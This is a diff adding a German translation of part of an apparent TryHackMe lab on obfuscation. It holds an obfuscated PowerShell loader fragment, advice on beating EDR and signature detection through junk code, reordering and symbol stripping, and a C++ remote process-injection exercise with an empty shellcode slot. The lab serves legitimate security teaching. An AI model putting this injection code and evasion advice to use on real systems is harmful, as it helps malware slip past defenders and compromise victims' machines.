@@ -463,3 +463,79 @@ $vbuf = ([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer
 ([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-PA (Get-Robf $xee2N) (Get-Robf $ahb3O)), (Get-TDef @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))).Invoke($vbuf, $vopcode.Length, 0x20, [ref](0)) | Out-Null
 ([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-PA (Get-Robf $xee2N) (Get-Robf $yhe4c)), (Get-TDef @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([UInt32])))).Invoke(0, 0, $vbuf, [IntPtr]0, 0, [ref](0)) | Out-Null
 ```
+
+Sie werden vielleicht bemerken, dass einige Cmdlets und Funktionen in ihrem Originalzustand belassen werden… warum ist das so? Abhängig von Ihren Zielen möchten Sie möglicherweise eine Anwendung erstellen, die Reverse Engineers auch nach der Erkennung noch verwirren kann, ohne sofort verdächtig zu wirken. Wenn ein Malware-Entwickler alle Cmdlets und Funktionen obfuskiert, würde dies die Entropie sowohl in interpretierten als auch in kompilierten Sprachen erhöhen und zu höheren EDR-Alarmwerten führen. Es könnte auch dazu führen, dass ein interpretierter Codeausschnitt in Logs verdächtig erscheint, wenn er scheinbar zufällig oder stark obfuskiert ist.
+
+### Code-Struktur
+
+Die Code-Struktur kann ein lästiges Problem sein, wenn es um alle Aspekte von bösartigem Code geht, die oft übersehen und nicht leicht identifiziert werden können. Wenn sie in interpretierten und kompilierten Sprachen nicht angemessen behandelt wird, kann dies zu Signaturen oder einfacheren Reverse Engineering durch einen Analysten führen.
+
+Wie im oben genannten Taxonomie-Papier behandelt, werden **Junk-Code** und die **Neuanordnung** von Code häufig als zusätzliche Maßnahmen verwendet, um die Komplexität eines interpretierten Programms zu erhöhen. Da das Programm nicht kompiliert ist, hat ein Analyst viel tiefere Einblicke in das Programm, und wenn es nicht künstlich mit Komplexität aufgebläht wird, kann er sich auf die genauen bösartigen Funktionen einer Anwendung konzentrieren.
+
+Die Trennung von verwandtem Code kann sowohl interpretierte als auch kompilierte Sprachen beeinflussen und zu verborgenen Signaturen führen, die schwer zu identifizieren sein können. Eine heuristische Signatur-Engine kann feststellen, ob ein Programm bösartig ist, basierend auf den umgebenden Funktionen oder API-Aufrufen. Um diese Signaturen zu umgehen, kann ein Angreifer das Vorkommen von verwandtem Code randomisieren, um die Engine zu täuschen und sie glauben zu machen, dass es sich um einen sicheren Aufruf oder eine sichere Funktion handelt.
+
+### Datei- & Kompilationseigenschaften
+
+Kleinere Aspekte eines kompilierten Binärdatei, wie die Kompilationsmethode, scheinen möglicherweise nicht wie eine kritische Komponente, können jedoch zu mehreren Vorteilen für einen Analysten führen. Zum Beispiel kann ein Analyst bei einem Programm, das als Debug-Build kompiliert wurde, alle verfügbaren globalen Variablen und andere Programminformationen erhalten.
+
+Wenn ein Programm als Debug-Build kompiliert wird, wird der Compiler eine Symbolsdatei einschließen. Symbole helfen üblicherweise beim Debuggen eines Binärbildes und können globale und lokale Variablen, Funktionsnamen und Einstiegspunkte enthalten. Angreifer müssen sich dieser möglichen Probleme bewusst sein, um eine ordnungsgemäße Kompilationspraxis sicherzustellen und sicherzustellen, dass keine Informationen an einen Analysten durchsickern.
+
+Glücklicherweise können Symbole durch den Compiler oder nach der Kompilierung leicht entfernt werden. Um Symbole aus einem Compiler wie Visual Studio zu entfernen, müssen wir das Kompilationsziel von `Debug` auf `Release` ändern oder einen leichtgewichtigeren Compiler wie **Mingw** verwenden.
+
+Wenn wir Symbole aus einem vor-kompilierten Image entfernen müssen, können wir das Kommandozeilen-Dienstprogramm `strip` verwenden.
+
+Das oben genannte Whitepaper [Layered Obfuscation Taxonomy](https://cybersecurity.springeropen.com/articles/10.1186/s42400-020-00049-3) fasst diese Praktiken gut unter der Methode des Entfernens redundanter Symbole der **Code-Element** Schicht zusammen.
+
+Im Folgenden finden Sie ein Beispiel zur Verwendung von "strip", um die Symbole aus einem Binärprogramm zu entfernen, das mit **gcc** mit aktivierter Debugging-Option kompiliert wurde.
+
+Bevor Sie ein Werkzeug aktiv verwenden, sollten mehrere andere Eigenschaften, wie Entropie oder Hash, in Betracht gezogen werden. Diese Konzepte werden in Aufgabe 5 des Raums zur [Signatur-Evasion](https://tryhackme.com/r/room/signatureevasion) behandelt.
+##
+Nutzen Sie das Wissen, das Sie während dieser Aufgabe erworben haben, um alle bedeutungsvollen Bezeichner oder Debug-Informationen aus dem folgenden C++-Quellcode mithilfe der AttackBox oder Ihrer eigenen virtuellen Maschine zu entfernen.
+
+Nachdem Sie den Quellcode angemessen obfuskiert und die Symbole entfernt haben, kompilieren Sie ihn mit `MingW32-G++` und reichen Sie ihn auf dem Webserver unter `http://MACHINE_IP/` ein.
+
+Hinweis: Der Dateiname muss `challenge-8.exe` lauten, um die Flagge zu erhalten.
+```c++
+#include "windows.h"
+#include <iostream>
+#include <string>
+using namespace std;
+
+int main(int argc, char* argv[])
+{
+	unsigned char shellcode[] = "";
+
+	HANDLE processHandle;
+	HANDLE remoteThread;
+	PVOID remoteBuffer;
+	string leaked = "This was leaked in the strings";
+
+	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
+	cout << "Handle obtained for" << processHandle;
+	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+	cout << "Buffer Created";
+	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
+	cout << "Process written with buffer" << remoteBuffer;
+	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
+	CloseHandle(processHandle);
+	cout << "Closing handle" << processHandle;
+	cout << leaked;
+
+	return 0;
+} 
+```
+
+## Fragen:
+Welche Flagge wird nach dem Hochladen eines ordnungsgemäß obfuskierten Ausschnitts gefunden?
+```
+
+```
+
+# Task 9 - Abschluss
+Verschleierung kann eines der profitabelsten Werkzeuge im Arsenal eines Angreifers sein, wenn es um Ausweichmanöver geht. Sowohl Angreifer als auch Verteidiger sollten sowohl die Verwendungen als auch die Auswirkungen von Verschleierung verstehen und bewerten.
+
+In diesem Raum haben wir die Grundprinzipien der Verschleierung behandelt, sowohl im Zusammenhang mit der Umgehung von Signaturen als auch mit der Anti-Rückwärtsentwicklung.
+
+Die Techniken, die in diesem Raum gezeigt wurden, sind im Allgemeinen werkzeugunabhängig und können auf viele Anwendungsfälle angewendet werden, da sowohl Werkzeuge als auch Verteidigungen sich entwickeln.
+
+An dieser Stelle können Sie die Verschleierung weiterführen, indem Sie sich direkt auf die [Umgehung von Signaturen](https://tryhackme.com/r/room/signatureevasion) konzentrieren, wo sie direkt auf Signaturen angewendet wird, oder Sie können sie auf einer höheren Ebene mit Verschleierungsprogrammen verwenden.
